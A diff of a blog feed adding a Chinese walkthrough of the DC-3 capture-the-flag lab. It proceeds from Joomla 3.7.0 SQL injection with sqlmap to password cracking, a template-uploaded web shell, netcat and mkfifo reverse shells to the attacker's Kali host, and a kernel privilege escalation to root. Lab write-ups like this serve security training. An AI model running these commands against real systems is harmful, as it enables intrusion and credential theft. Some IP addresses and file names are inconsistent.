@@ -13,7 +13,532 @@
         <pubDate>Sun, 21 Dec 2025 18:50:23 +0800</pubDate>
         
         <guid>https://1noah11.github.io/lyeve.github.io/p/dc-3%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B/</guid>
-        <description></description>
+        <description>&lt;h3 id=&#34;一环境搭建过程&#34;&gt;一、&lt;strong&gt;环境搭建过程&lt;/strong&gt;
+&lt;/h3&gt;&lt;p&gt;(1) 下载DC-3靶场 拖入VMware。&lt;/p&gt;
+&lt;p&gt;(2) 修改网络适配器为NAT模式&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image002.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt; &lt;/p&gt;
+&lt;p&gt;(3) 修改IDE 改为0：0&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image003.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt; &lt;/p&gt;
+&lt;p&gt;图2 IDE设置&lt;/p&gt;
+&lt;h3 id=&#34;二渗透测试过程&#34;&gt;二、&lt;strong&gt;渗透测试过程&lt;/strong&gt;
+&lt;/h3&gt;&lt;p&gt;(1)首先进入kali虚拟机打开终端，输入ip addr查询靶场的ip如图1所示，靶场ip为192.168.248.0/24&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image005.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt; 
+图3 查询靶场ip&lt;/p&gt;
+&lt;p&gt;(2)利用namp工具查询目标靶机&lt;/p&gt;
+&lt;p&gt;Kali虚拟机的ip为192.168.248.135&lt;/p&gt;
+&lt;p&gt;靶机的ip为192.168.248.136&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image008.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt; 
+图4 本机ip和靶机ip&lt;/p&gt;
+&lt;p&gt;(3)探端口以及服务&lt;/p&gt;
+&lt;p&gt;利用nmap -A -p- -v命令查询端口开启状况&lt;/p&gt;
+&lt;p&gt;可以看到80端口是开放的，存在web服务，Apache/2.4.18&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image010.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt; &lt;/p&gt;
+&lt;p&gt;图5 靶机的端口及服务开启情况&lt;/p&gt;
+&lt;p&gt;(4)访问&lt;a class=&#34;link&#34; href=&#34;http://192,168,248,136&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://192,168,248,136&lt;/a&gt; &lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image012.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt; &lt;/p&gt;
+&lt;p&gt;图6 访问靶机主页地址&lt;/p&gt;
+&lt;p&gt;页面显示必须获得权限&lt;/p&gt;
+&lt;p&gt;(5)安装joomscan&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image014.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt; &lt;/p&gt;
+&lt;p&gt;图7 安装joomscan&lt;/p&gt;
+&lt;p&gt;(6) 利用joomscan &amp;ndash;url http://192.168.248.136命令&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image016.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt; &lt;/p&gt;
+&lt;p&gt;图8 获取网站后台管理地址&lt;/p&gt;
+&lt;p&gt;得到joomla版本信息， 版本为3.7.0 也得到了网站后台地址&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://192.168.248.136/administrator/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://192.168.248.136/administrator/&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image018.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;图9 后台管理登录页面&lt;/p&gt;
+&lt;p&gt;(7)用nikto扫描获取后台地址&lt;/p&gt;
+&lt;p&gt;Nikto可以扫描指定主机的WEB类型、主机名、指定目录、特定CGI漏洞、返回主机允许的 http模式等&lt;/p&gt;
+&lt;p&gt;输入nikto &amp;ndash;url &lt;a class=&#34;link&#34; href=&#34;http://192.168.186.131/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://192.168.186.131/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image020.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt; &lt;/p&gt;
+&lt;p&gt;图10 nikto扫描结果&lt;/p&gt;
+&lt;p&gt;(8)输入searchsploit joomla 3.7.0&lt;/p&gt;
+&lt;p&gt;前面已经知道了joomla的版本是3.7.0&lt;/p&gt;
+&lt;p&gt;利用searchsploit命令扫描漏洞&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image021.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt; &lt;/p&gt;
+&lt;p&gt;图11 searchsploit扫描结果&lt;/p&gt;
+&lt;p&gt;发现存在一个sql注入漏洞，和xss漏洞&lt;/p&gt;
+&lt;p&gt;(9)输入 searchsploit -m 42033.txt查看漏洞提示信息&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image022.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt; &lt;/p&gt;
+&lt;p&gt;图12 sql注入漏洞提示信息&lt;/p&gt;
+&lt;p&gt;(10)输入cat 42033.txt查看漏洞文件详细信息&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image024.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt; &lt;/p&gt;
+&lt;p&gt;图13 sql注入漏洞详细信息&lt;/p&gt;
+&lt;p&gt;(11)将把localhost修改为我们的靶机IP，到浏览器去访问&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://192.168.248.136/index.php?option=com_fields&amp;amp;view=fields&amp;amp;layout=modal&amp;amp;list[fullordering]=updatexml%22&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://192.168.248.136/index.php?option=com_fields&amp;amp;view=fields&amp;amp;layout=modal&amp;amp;list[fullordering]=updatexml%22&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;看到提示： 您的SQL语法有错误;说明进行了拼接，存在SQL注入&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image026.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;  &lt;/p&gt;
+&lt;p&gt;图14 sql注入漏洞页面&lt;/p&gt;
+&lt;p&gt;(12) sqlmap扫描&lt;/p&gt;
+&lt;p&gt;输入sqlmap -u&lt;/p&gt;
+&lt;p&gt;“http://192.168.248.136/index.php?option=com_fields&amp;amp;view=fields&amp;amp;layout=modal&amp;amp;list[fullordering]=updatexml”&amp;ndash;risk=3 &amp;ndash;level=5 &amp;ndash;random-agent &amp;ndash;dbs -p list[fullordering] –batch&lt;/p&gt;
+&lt;p&gt;跑出的数据库如图所示&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image028.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;  &lt;/p&gt;
+&lt;p&gt;图15sqlmap 跑出的所有数据库&lt;/p&gt;
+&lt;p&gt;(13)输入 sqlmap -u&lt;/p&gt;
+&lt;p&gt;&amp;ldquo;http://192.168.248.136/index.php?option=com_fields&amp;amp;view=fields&amp;amp;layout=modal&amp;amp;list[fullordering]=updatexml”&amp;ndash;risk=3 &amp;ndash;level=5 &amp;ndash;random-agent &amp;ndash;dbs -p list[fullordering]  &amp;ndash;current-db –batch获取当前数据库&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image030.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;  &lt;/p&gt;
+&lt;p&gt;图16 sqlmap 获取当前数据库&lt;/p&gt;
+&lt;p&gt;(14)输入 sqlmap -u&lt;/p&gt;
+&lt;p&gt;&amp;ldquo;http://192.168.248.136/index.php?option=com_fields&amp;amp;view=fields&amp;amp;layout=modal&amp;amp;list[fullordering]=updatexml&amp;rdquo; &amp;ndash;risk=3 -p list[fullordering] -D &amp;ldquo;joomladb&amp;rdquo; &amp;ndash;tables &amp;ndash;batch&lt;/p&gt;
+&lt;p&gt;获取到当前数据库中的表&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image032.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt; &lt;/p&gt;
+&lt;p&gt;图17   sqlmap 获取joomladb中表的信息&lt;/p&gt;
+&lt;p&gt;(15)输入sqlmap -u&lt;/p&gt;
+&lt;p&gt;&amp;ldquo;http://192.168.186.131/index.php?option=com_fields&amp;amp;view=fields&amp;amp;layout=modal&amp;amp;list[fullordering]=updatexml&amp;rdquo; &amp;ndash;risk=3 -p list[fullordering] -D &amp;ldquo;joomladb&amp;rdquo; &amp;ndash;tables -T &amp;ldquo;#__users&amp;rdquo; &amp;ndash;columns&lt;/p&gt;
+&lt;p&gt;第一个选项选y&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image034.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt; &lt;/p&gt;
+&lt;p&gt;图18   sqlmap 获取users表信息1&lt;/p&gt;
+&lt;p&gt;第二个选项也是y&lt;/p&gt;
+&lt;p&gt;第三个默认&lt;/p&gt;
+&lt;p&gt;第四个选10&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image036.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt; &lt;/p&gt;
+&lt;p&gt;图19  sqlmap 获取users表信息2&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image038.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt; &lt;/p&gt;
+&lt;p&gt;图20   sqlmap 获取到的users表中的关键列&lt;/p&gt;
+&lt;p&gt;(16)输入sqlmap -u &amp;ldquo;http://192.168.248.136/index.php?option=com_fields&amp;amp;view=fields&amp;amp;layout=modal&amp;amp;list[fullordering]=updatexml&amp;rdquo; &amp;ndash;risk=3 -p list[fullordering] -D &amp;ldquo;joomladb&amp;rdquo; &amp;ndash;tables -T &amp;ldquo;#__users&amp;rdquo; &amp;ndash;columns -C &amp;ldquo;username,password&amp;rdquo; &amp;ndash;dump &amp;ndash;batch&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image040.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt; &lt;/p&gt;
+&lt;p&gt;图21   sqlmap 获取到用户名密码&lt;/p&gt;
+&lt;p&gt;(17)利用jhon破解密码&lt;/p&gt;
+&lt;p&gt;先创建一个1.txt，把加密的密码字段写入echo ‘$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu’ &amp;gt; 1.txt  &lt;/p&gt;
+&lt;p&gt;再输入cat 1.txt 打开1.txt文件&lt;/p&gt;
+&lt;p&gt;在输入jhon 1.txt破解密码&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image042.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt; &lt;/p&gt;
+&lt;p&gt;图22   jhon破解密码&lt;/p&gt;
+&lt;p&gt;(18)在 &lt;a class=&#34;link&#34; href=&#34;http://192.168.248.136/administrator/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://192.168.248.136/administrator/&lt;/a&gt;网站   &lt;/p&gt;
+&lt;p&gt;登录  用户名是admin 密码是snoopy&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image044.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt; &lt;/p&gt;
+&lt;p&gt;图23   破解后网站首页&lt;/p&gt;
+&lt;p&gt;点击Extensions,然后弹出一个框，选templates，再选templates&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image046.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt; &lt;/p&gt;
+&lt;p&gt;图24 设置界面&lt;/p&gt;
+&lt;p&gt;进入页面，再点击Beez3 Details and Files&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image048.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt; &lt;/p&gt;
+&lt;p&gt;图25 设置界面2&lt;/p&gt;
+&lt;p&gt;然后点击页面中的new files，可以上传文件&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image050.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt; &lt;/p&gt;
+&lt;p&gt;图26  上传文件&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image052.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt; &lt;/p&gt;
+&lt;p&gt;图27&lt;/p&gt;
+&lt;p&gt;在html目录下上传php文件命名为shell.php具体代码如下图所示。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image054.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt; &lt;/p&gt;
+&lt;p&gt;图28 shell.php上传&lt;/p&gt;
+&lt;p&gt;再次访问&lt;a class=&#34;link&#34; href=&#34;http://192.168.248.136/templates/beez3/html/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://192.168.248.136/templates/beez3/html/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;可以看到多了shell.php文件&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image056.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt; &lt;/p&gt;
+&lt;p&gt;图29文件上传成功&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image058.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt; &lt;/p&gt;
+&lt;p&gt;图30文件显示界面&lt;/p&gt;
+&lt;p&gt;(19)打开中国蚁剑，测试连接&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image060.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt; &lt;/p&gt;
+&lt;p&gt;图31连接成功&lt;/p&gt;
+&lt;p&gt;(20)打开终端输入whoami&lt;/p&gt;
+&lt;p&gt;是www-data权限&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image062.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt; &lt;/p&gt;
+&lt;p&gt;图32 查询whoami权限&lt;/p&gt;
+&lt;p&gt;(21)反弹shell到kali 输入nc -lvvp 1234&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image064.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt; &lt;/p&gt;
+&lt;p&gt;图33 kali开启监听&lt;/p&gt;
+&lt;p&gt;(22)蚁剑终端输入nc -e /bin/bash 192.168.248.135 1234&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image066.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt; &lt;/p&gt;
+&lt;p&gt;图34 -e参数不可用&lt;/p&gt;
+&lt;p&gt;(23)换个命令使用rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.248.135 1234 &amp;gt;/tmp/f&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image068.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt; &lt;/p&gt;
+&lt;p&gt;图35反弹shell成功&lt;/p&gt;
+&lt;p&gt;(24)交互式shell&lt;/p&gt;
+&lt;p&gt; 常用的就是python创建交互式shell&lt;/p&gt;
+&lt;p&gt; 接着输入 python3 -c &amp;lsquo;import pty; pty.spawn(&amp;quot;/bin/bash&amp;rdquo;)&amp;rsquo;  点击回车，在输入ls&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image070.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt; &lt;/p&gt;
+&lt;p&gt;图36 交互式shell配置成功&lt;/p&gt;
+&lt;p&gt;(25)上传辅助脚本&lt;/p&gt;
+&lt;p&gt;下载辅助脚本Linux-Exploit-Suggester.sh&lt;/p&gt;
+&lt;p&gt;下载地址：https://github.com/mzet-/linux-exploit-suggester&lt;/p&gt;
+&lt;p&gt;上传脚本，直接在蚁剑里上传，点击右键，选择上传文件，选择刚刚下好的脚本，点击打开上传成功&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image072.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt; &lt;/p&gt;
+&lt;p&gt;图37辅助脚本上传成功&lt;/p&gt;
+&lt;p&gt;(26)输入ls点击回车，发现漏洞   ls -l linux-exploit-suggester.sh&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image074.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt; &lt;/p&gt;
+&lt;p&gt;图38发现漏洞&lt;/p&gt;
+&lt;p&gt;(27)发现没有执行权限，我们给他加个执行文件&lt;/p&gt;
+&lt;p&gt;输入chmod +x linux-exploit-suggester.sh&lt;/p&gt;
+&lt;p&gt;和 ./linux-exploit-suggester.sh 发现很多漏洞&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image076.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;
+图39发现漏洞1&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image078.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt; &lt;/p&gt;
+&lt;p&gt;图40发现漏洞2&lt;/p&gt;
+&lt;p&gt;(28)挑选cve-2016-4557漏洞进行提权&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image080.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt; &lt;/p&gt;
+&lt;p&gt;图41 挑选漏洞进行提权&lt;/p&gt;
+&lt;p&gt;(29)输入图片中的url下载文件   然后利用蚁剑上传文件&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image082.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt; &lt;/p&gt;
+&lt;p&gt;图42上传漏洞文件&lt;/p&gt;
+&lt;p&gt;(30)输入ls&lt;/p&gt;
+&lt;p&gt;unzip 39972.zip 解压文件&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image084.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;  &lt;/p&gt;
+&lt;p&gt;图43 解压文件&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image086.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt; 
+图44解压成功&lt;/p&gt;
+&lt;p&gt;(31)输入cd 39772&lt;/p&gt;
+&lt;p&gt;ls&lt;/p&gt;
+&lt;p&gt;tar -xvf exploit.tar&lt;/p&gt;
+&lt;p&gt;cd ebpf_mapfd_doubleput_exploit&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image088.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;  &lt;/p&gt;
+&lt;p&gt;图45 逐步提权&lt;/p&gt;
+&lt;p&gt;(32)输入ls点击回车  输入./compile.sh 点击回车  输入./doubleput.c点击回车&lt;/p&gt;
+&lt;p&gt;输入ls点击回车    在输入./doubleput点击回车
+&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image090.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;图46 提权成功&lt;/p&gt;
+&lt;p&gt;(33)输入whoami 获得root权限&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image092.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;  &lt;/p&gt;
+&lt;p&gt;图47 获得root权限&lt;/p&gt;
+&lt;p&gt;(34)输入cd  /root回车&lt;/p&gt;
+&lt;p&gt;输入ls 回车&lt;/p&gt;
+&lt;p&gt;cat the-flag.txt回车&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://1noah11.github.io/lyeve.github.io/image094.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt; &lt;/p&gt;
+&lt;p&gt;图48 拿到flag&lt;/p&gt;
+</description>
         </item>
         <item>
         <title>New111</title>
